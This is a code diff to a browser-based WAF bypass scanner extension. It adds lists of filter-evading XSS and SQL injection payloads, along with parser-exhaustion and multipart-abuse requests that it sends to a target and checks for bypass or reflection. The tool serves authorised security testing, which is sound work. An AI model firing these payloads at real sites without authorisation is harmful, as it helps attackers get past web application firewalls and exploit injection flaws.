@@ -9,6 +9,7 @@
  *   waf_insane.py  — 150 protocol-level edge case tests
  *   waf_seam.py    — 35 architecture seam tests
  *   waf_chaos.py   — 35 WAF engine confusion tests
+ *   waf_nuke.py    — 51 confirmed 2025/2026 bypass payloads + 29 insane mode
  *
  * Adapted for browser execution (fetch API).
  * Tests categories:
@@ -22,6 +23,10 @@
  *   8. Architecture seam attacks (15+ variants)
  *   9. WAF engine confusion / chaos (20+ variants)
  *  10. Well-known path abuse (15+ variants)
+ *  11. Referer/Origin bypass (7+ variants)
+ *  12. Confirmed XSS bypass payloads (20 confirmed 2025/2026)
+ *  13. Confirmed SQLi bypass payloads (10 confirmed 2025/2026)
+ *  14. Insane mode — parser budget / multipart abuse (15+ variants)
  *
  * Author: Bountyy Oy - Lonkero Scanner Extension
  */
@@ -175,6 +180,33 @@
     }
 
     return false;
+  }
+
+  /**
+   * Payload bypass detection: checks if an attack payload (XSS/SQLi)
+   * passed through the WAF without being blocked.
+   * Opposite logic to isBypassed(): here a 200 with no block = WAF missed the payload.
+   */
+  function isPayloadBypassed(resp, payload) {
+    if (resp.status === 0) return { bypassed: false, reflected: false };
+
+    // WAF blocked the payload - NOT a bypass
+    const blocked = isBlocked(resp.status, resp.bodySnippet);
+    if (blocked) return { bypassed: false, reflected: false };
+
+    // 200 OK without block indicators = payload passed through WAF
+    const bypassed = resp.status >= 200 && resp.status < 400;
+
+    // Check if payload is reflected in the response (confirmed XSS)
+    let reflected = false;
+    if (bypassed && payload && resp.bodySnippet) {
+      const check = payload.substring(0, 30).toLowerCase();
+      if (check.length > 3) {
+        reflected = resp.bodySnippet.toLowerCase().includes(check);
+      }
+    }
+
+    return { bypassed, reflected };
   }
 
   function parsePath(url) {
@@ -620,6 +652,212 @@
   }
 
   // ============================================
+  // TEST CATEGORY 12: CONFIRMED XSS BYPASSES (20 tests)
+  // From waf_nuke.py: get_confirmed_bypasses — confirmed 2025/2026
+  // ============================================
+
+  function generateConfirmedXSS() {
+    return [
+      { name: 'SVG null byte + fake attr', payload: '<svg\x00/onload=alert(1)>', technique: 'null-byte' },
+      { name: 'Img mixed case OnErroR + confirm()', payload: '<Img/Src/OnErroR=confirm(1)>', technique: 'case-mutation' },
+      { name: 'Img/Src/OnError=(alert)(1)', payload: '<Img/Src/OnError=(alert)(1)>', technique: 'parentheses-wrap' },
+      { name: 'SVG onload backtick template', payload: '<svg/onload=alert`1`>', technique: 'template-literal' },
+      { name: 'details onToggle (July 2025 vector)', payload: '<details open ontoggle=confirm(1)>', technique: 'ontoggle-abuse' },
+      { name: 'Body onload HTML entities', payload: '<body onload=&#97;lert(1)>', technique: 'html-entity' },
+      { name: 'Attribute overloading with custom attrs', payload: '<div data-x=1 data-y=2 data-z=3 onfocus=confirm(1) contenteditable tabindex=1>click</div>', technique: 'attr-overload' },
+      { name: 'Unicode fullwidth brackets NFKD', payload: '\uff1cimg src=x onerror=alert(1)\uff1e', technique: 'unicode-nfkd' },
+      { name: 'SVG animate javascript URI', payload: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', technique: 'svg-animate' },
+      { name: 'Math maction onclick', payload: '<math><maction actiontype=toggle><mi>click</mi></maction></math>', technique: 'mathml' },
+      { name: 'iframe srcdoc base64', payload: '<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">', technique: 'srcdoc' },
+      { name: 'object data javascript URI', payload: '<object data="javascript:alert(1)">', technique: 'object-data' },
+      { name: 'input autofocus onfocus', payload: '<input autofocus onfocus=alert(1)>', technique: 'autofocus' },
+      { name: 'marquee onstart unicode obfuscated', payload: '<marquee onstart=\u0061lert(1)>', technique: 'unicode-escape' },
+      { name: 'Double URL encoded script tag', payload: '%253Cscript%253Ealert(1)%253C/script%253E', technique: 'double-encode' },
+      { name: 'SVG set onbegin', payload: '<svg><set onbegin=alert(1) attributeName=x to=y>', technique: 'svg-set' },
+      { name: 'Function constructor eval', payload: '<img src=x onerror="Function(`ale`+`rt(1)`)();">', technique: 'func-constructor' },
+      { name: 'data URI base64 svg', payload: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', technique: 'data-uri' },
+      { name: 'LF between tag and event handler', payload: '<svg\nonload=alert(1)>', technique: 'lf-split' },
+      { name: 'Non-alpha chars in event handler', payload: '<img src=x onerror/=alert(1)>', technique: 'slash-event' },
+    ];
+  }
+
+  // ============================================
+  // TEST CATEGORY 13: CONFIRMED SQLi BYPASSES (10 tests)
+  // From waf_nuke.py: get_confirmed_bypasses — confirmed 2025/2026
+  // ============================================
+
+  function generateConfirmedSQLi() {
+    return [
+      { name: 'JSON-wrapped UNION SELECT (Team82)', payload: '{"id":"1 UNION SELECT 1,2,3--"}', technique: 'json-sqli' },
+      { name: 'Inline comment obfuscation', payload: "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", technique: 'inline-comment' },
+      { name: 'Scientific notation bypass', payload: '1e0UNION SELECT 1,2,3--', technique: 'scientific' },
+      { name: 'Tab between UNION SELECT', payload: "1'\tUNION\tSELECT\t1,2,3--", technique: 'tab-separator' },
+      { name: 'Null byte before UNION', payload: "1'\x00 UNION SELECT 1,2,3--", technique: 'null-byte-sqli' },
+      { name: 'HTTP Parameter Pollution dual param', payload: '1&q=UNION+SELECT+1,2,3--', technique: 'hpp' },
+      { name: 'Unicode fullwidth UNION', payload: "1' \uff35\uff2e\uff29\uff2f\uff2e SELECT 1,2,3--", technique: 'unicode-sqli' },
+      { name: 'Time-based blind with comment obfuscation', payload: "1' AND /*!50000SLEEP*/(5)--", technique: 'time-blind' },
+      { name: 'GROUP BY HAVING error-based', payload: "1' GROUP BY 1 HAVING 1=1--", technique: 'having' },
+      { name: 'Charset Shift_JIS multibyte escape', payload: "%e5' UNION SELECT 1,2,3--", technique: 'shiftjis-multibyte' },
+    ];
+  }
+
+  // ============================================
+  // TEST CATEGORY 14: INSANE MODE (15+ tests)
+  // From waf_nuke.py: get_insane_payloads — parser budget exhaustion,
+  // multipart boundary abuse, content-type confusion, charset tricks
+  // ============================================
+
+  function generateInsaneMode(path, host) {
+    const tests = [];
+    const param = 'lonkero_test';
+    const sqliPayload = encodeURIComponent("1' UNION SELECT 1,2,3--");
+    const xssPayload = encodeURIComponent('<script>alert(1)</script>');
+
+    // --- Parser budget exhaustion ---
+    // 500 junk params with SQLi hidden in the last one
+    const junkParams = Array.from({ length: 200 }, (_, i) => `p${i}=${'A'.repeat(50)}`).join('&');
+    tests.push({
+      name: 'Budget: 200 junk params + SQLi in last',
+      path: path + (path.includes('?') ? '&' : '?') + junkParams + '&' + param + '=' + sqliPayload,
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    // Oversized Cookie (32KB) with SQLi in query
+    tests.push({
+      name: 'Budget: 32KB cookie + SQLi param',
+      path: path + (path.includes('?') ? '&' : '?') + param + '=' + sqliPayload,
+      headers: { 'Cookie': 'x=' + 'B'.repeat(32768) },
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    // 100 padding headers with SQLi in query
+    const paddingHeaders = {};
+    for (let i = 0; i < 50; i++) {
+      paddingHeaders[`X-Pad-${i}`] = 'C'.repeat(200);
+    }
+    tests.push({
+      name: 'Budget: 50 padding headers + SQLi param',
+      path: path + (path.includes('?') ? '&' : '?') + param + '=' + sqliPayload,
+      headers: paddingHeaders,
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    // --- Content-Type confusion (claim JSON, send URL-encoded SQLi) ---
+    tests.push({
+      name: 'CType confusion: JSON header + URL-encoded SQLi body',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: param + "=1' UNION SELECT 1,2,3--",
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    tests.push({
+      name: 'CType confusion: XML header + URL-encoded SQLi body',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/xml' },
+      body: param + "=1' UNION SELECT 1,2,3--",
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    tests.push({
+      name: 'CType confusion: unknown x-amf + SQLi body',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-amf' },
+      body: param + "=1' UNION SELECT 1,2,3--",
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    // --- Charset tricks ---
+    tests.push({
+      name: 'Charset IBM037 EBCDIC SQLi body',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=IBM037' },
+      body: param + "=1' UNION SELECT 1,2,3--",
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    tests.push({
+      name: 'Charset Shift_JIS multibyte escape SQLi',
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=Shift_JIS' },
+      body: param + "=%e5' UNION SELECT 1,2,3--",
+      isPayloadTest: true,
+      payload: "UNION SELECT 1,2,3",
+    });
+
+    // --- Multipart boundary abuse ---
+    tests.push({
+      name: 'Multipart: SQLi inside boundary name',
+      method: 'POST',
+      headers: { 'Content-Type': 'multipart/form-data; boundary=UNION SELECT 1,2,3--' },
+      body: '--UNION SELECT 1,2,3--\r\nContent-Disposition: form-data; name="q"\r\n\r\nhello\r\n--UNION SELECT 1,2,3----\r\n',
+      isPayloadTest: true,
+      payload: 'UNION SELECT 1,2,3',
+    });
+
+    tests.push({
+      name: 'Multipart: nested with XSS in inner part',
+      method: 'POST',
+      headers: { 'Content-Type': 'multipart/form-data; boundary=outer' },
+      body: '--outer\r\nContent-Type: multipart/mixed; boundary=inner\r\n\r\n--inner\r\nContent-Disposition: form-data; name="q"\r\n\r\n<script>alert(1)</script>\r\n--inner--\r\n--outer--\r\n',
+      isPayloadTest: true,
+      payload: '<script>alert(1)</script>',
+    });
+
+    // --- Protocol / upgrade tricks (browser-feasible) ---
+    tests.push({
+      name: 'H2C upgrade + SQLi param',
+      path: path + (path.includes('?') ? '&' : '?') + param + '=' + sqliPayload,
+      headers: {
+        'Upgrade': 'h2c',
+        'Connection': 'Upgrade, HTTP2-Settings',
+        'HTTP2-Settings': 'AAMAAABkAAQCAAAAAAIAAAAA',
+      },
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    tests.push({
+      name: 'WebSocket upgrade + SQLi param',
+      path: path + (path.includes('?') ? '&' : '?') + param + '=' + sqliPayload,
+      headers: {
+        'Upgrade': 'websocket',
+        'Connection': 'Upgrade',
+        'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
+        'Sec-WebSocket-Version': '13',
+      },
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    // --- Pipelining simulation: multiple params to confuse parser ---
+    tests.push({
+      name: 'Pipeline simulation: 10 clean params + SQLi last',
+      path: path + (path.includes('?') ? '&' : '?') + Array.from({ length: 10 }, (_, i) => `clean${i}=safe`).join('&') + '&' + param + '=' + sqliPayload,
+      isPayloadTest: true,
+      payload: "1' UNION SELECT 1,2,3--",
+    });
+
+    // --- HTTP/1.0 hint ---
+    tests.push({
+      name: 'Cache-Control: HTTP/1.0 no-cache + XSS param',
+      path: path + (path.includes('?') ? '&' : '?') + param + '=' + xssPayload,
+      headers: { 'Cache-Control': 'no-cache', 'Pragma': 'no-cache' },
+      isPayloadTest: true,
+      payload: '<script>alert(1)</script>',
+    });
+
+    return tests;
+  }
+
+  // ============================================
   // MAIN SCAN ENGINE
   // ============================================
 
@@ -694,6 +932,73 @@
   }
 
   /**
+   * Run payload injection category — tests if WAF rule engine blocks attack payloads.
+   * Uses isPayloadBypassed() detection: 200 = WAF missed it = finding.
+   */
+  async function runPayloadCategory(categoryName, payloads, baseUrl, parsed) {
+    const categoryFindings = [];
+    const total = payloads.length;
+    const param = 'lonkero_test';
+
+    for (let i = 0; i < payloads.length; i++) {
+      if (_cancelled) break;
+
+      const test = payloads[i];
+      updateProgress(categoryName, _progress.done + i, _progress.total);
+
+      try {
+        // Build request URL with payload in query param
+        let testUrl = baseUrl;
+        if (test.path) {
+          testUrl = parsed.origin + test.path;
+        } else if (test.payload && !test.method) {
+          // Inject payload as query parameter
+          testUrl = baseUrl + (baseUrl.includes('?') ? '&' : '?') + param + '=' + encodeURIComponent(test.payload);
+        }
+
+        // Build fetch options
+        const opts = {};
+        if (test.method) opts.method = test.method;
+        if (test.headers) opts.headers = { ...test.headers };
+        if (test.body !== undefined) opts.body = test.body;
+
+        const resp = await tryFetch(testUrl, opts);
+
+        const result = isPayloadBypassed(resp, test.payload);
+        if (result.bypassed) {
+          const severity = result.reflected ? 'critical' : 'high';
+          const finding = {
+            type: result.reflected ? 'WAF_BYPASS_CRITICAL' : 'WAF_BYPASS',
+            severity,
+            category: categoryName,
+            url: testUrl,
+            technique: test.name || test.technique,
+            description: result.reflected
+              ? `Confirmed ${categoryName} bypass: ${test.name} — payload reflected in response!`
+              : `${categoryName} WAF rule bypass: ${test.name} — payload not blocked`,
+            evidence: `Response: ${resp.status} (${resp.bodyLength}B)` + (result.reflected ? ' — REFLECTED' : ''),
+            bypassStatus: resp.status,
+            bypassSize: resp.bodyLength,
+            server: resp.server,
+            cfRay: resp.cfRay,
+            reflected: result.reflected,
+          };
+          categoryFindings.push(finding);
+          reportFinding(finding);
+        }
+
+        if (i % 5 === 4) await sleep(DELAY_BETWEEN_REQUESTS_MS);
+
+      } catch (e) {
+        // Continue on error
+      }
+    }
+
+    _progress.done += total;
+    return categoryFindings;
+  }
+
+  /**
    * Main scan function - runs ALL WAF bypass techniques against the current URL.
    */
   async function scan(targetUrl) {
@@ -703,7 +1008,7 @@
     _progress = { total: 0, done: 0, bypasses: 0, category: 'initializing' };
 
     console.log(`[WAF Bypass] Starting comprehensive scan on ${url}`);
-    console.log(`[WAF Bypass] Derived from waf_insane.py (150 tests), waf_seam.py (35 tests), waf_chaos.py (35 tests)`);
+    console.log(`[WAF Bypass] Derived from waf_insane.py, waf_seam.py, waf_chaos.py, waf_nuke.py`);
 
     const parsed = parsePath(url);
     if (!parsed) {
@@ -749,17 +1054,23 @@
     const wellKnownTests = generateWellKnownPaths(parsed.path);
     const refererTests = generateRefererBypasses(parsed.origin);
 
+    // New categories from waf_nuke.py
+    const confirmedXSS = generateConfirmedXSS();
+    const confirmedSQLi = generateConfirmedSQLi();
+    const insaneTests = generateInsaneMode(parsed.path, parsed.host);
+
     const totalTests = pathTests.length + encodingTests.length + headerTests.length +
       methodTests.length + hostTests.length + cacheTests.length + ctTests.length +
-      seamTests.length + chaosTests.length + wellKnownTests.length + refererTests.length;
+      seamTests.length + chaosTests.length + wellKnownTests.length + refererTests.length +
+      confirmedXSS.length + confirmedSQLi.length + insaneTests.length;
 
     _progress.total = totalTests;
-    console.log(`[WAF Bypass] Running ${totalTests} tests across 11 categories...`);
+    console.log(`[WAF Bypass] Running ${totalTests} tests across 14 categories...`);
 
     const allFindings = [];
 
-    // Run categories sequentially to avoid overwhelming the target
-    const categories = [
+    // Run access-bypass categories (tests path/header tricks to bypass access blocks)
+    const accessCategories = [
       ['Path Normalization', pathTests],
       ['Encoding Bypass', encodingTests],
       ['Header Bypass', headerTests],
@@ -773,13 +1084,30 @@
       ['Referer/Origin Bypass', refererTests],
     ];
 
-    for (const [catName, tests] of categories) {
+    for (const [catName, tests] of accessCategories) {
       if (_cancelled) break;
       console.log(`[WAF Bypass] Running: ${catName} (${tests.length} tests)`);
       const catFindings = await runCategory(catName, tests, url, baseline, parsed);
       allFindings.push(...catFindings);
       console.log(`[WAF Bypass]   ${catName}: ${catFindings.length} bypasses found`);
     }
+
+    // Run payload-injection categories (tests if WAF rule engine blocks attack payloads)
+    const payloadCategories = [
+      ['Confirmed XSS Bypass', confirmedXSS],
+      ['Confirmed SQLi Bypass', confirmedSQLi],
+      ['Insane Mode', insaneTests],
+    ];
+
+    for (const [catName, payloads] of payloadCategories) {
+      if (_cancelled) break;
+      console.log(`[WAF Bypass] Running: ${catName} (${payloads.length} tests)`);
+      const catFindings = await runPayloadCategory(catName, payloads, url, parsed);
+      allFindings.push(...catFindings);
+      console.log(`[WAF Bypass]   ${catName}: ${catFindings.length} bypasses found`);
+    }
+
+    const allCategoryNames = [...accessCategories, ...payloadCategories].map(c => c[0]);
 
     // Build report
     const report = {
@@ -804,7 +1132,7 @@
     };
 
     // Category breakdown
-    for (const [catName] of categories) {
+    for (const catName of allCategoryNames) {
       const catFindings = allFindings.filter(f => f.category === catName);
       report.summary.categories[catName] = {
         bypasses: catFindings.length,
@@ -857,5 +1185,5 @@
     }
   });
 
-  console.log('[Lonkero] WAF Bypass Scanner v1.0 loaded. 220+ techniques from waf_insane/waf_seam/waf_chaos. Use wafBypass.scan()');
+  console.log('[Lonkero] WAF Bypass Scanner v1.1 loaded. 265+ techniques from waf_insane/waf_seam/waf_chaos/waf_nuke. Use wafBypass.scan()');
 })();
